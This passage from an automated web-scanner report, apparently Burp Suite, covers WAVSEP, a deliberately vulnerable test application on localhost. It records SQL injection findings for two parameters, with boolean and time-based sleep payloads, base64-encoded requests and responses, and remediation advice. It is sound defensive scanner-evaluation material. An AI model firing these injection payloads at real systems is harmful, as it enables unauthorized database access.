<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>75220403 or 7934=07934</b> and <b>37494320 or 5155=5162</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20014</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTE3NTIyMDQwMyUyMG9yJTIwNzkzNCUzZDA3OTM0]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTMyCjwvVEQ+CjxURD4KMTAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTEzNzQ5NDMyMCUyMG9yJTIwNTE1NSUzZDUxNjI=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5206538769201732608</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case07-InjectionInSearch-Numeric-UnionExploit-WithDifferent200Responses.jsp [msgId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgId</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>28500405 or 5721=05721</b> and <b>31450666 or 1397=1401</b> were each submitted in the msgId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgId parameter. The application took <b>20005</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9MTI4NTAwNDA1JTIwb3IlMjA1NzIxJTNkMDU3MjE=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3NTgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CnRlc3RpbnB1dAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMgo8L1REPgo8VEQ+ClJlbWVtYmVyIHRvIGNoYW5nZSB5b3VyIHBhc3N3b3JkCjwvVEQ+CjxURD4KSW52ZXN0IGluIHlvdXIgc2VjdXJpdHkhCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgozCjwvVEQ+CjxURD4KWW91ciBhY2NvdW50IGlzIGFib3V0IHRvIGV4cGlyZQo8L1REPgo8VEQ+ClBsZWFzZSByZW5ldyBpdCBpbiB0aGUgbmV4dCB0d28gd2Vla3MKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnSWQ9MTMxNDUwNjY2JTIwb3IlMjAxMzk3JTNkMTQwMQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0NTgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNyAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDctSW5qZWN0aW9uSW5TZWFyY2gtTnVtZXJpYy1VbmlvbkV4cGxvaXQtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMFZhbGlkL0Nhc2UwNy1JbmplY3Rpb25JblNlYXJjaC1OdW1lcmljLVVuaW9uRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBB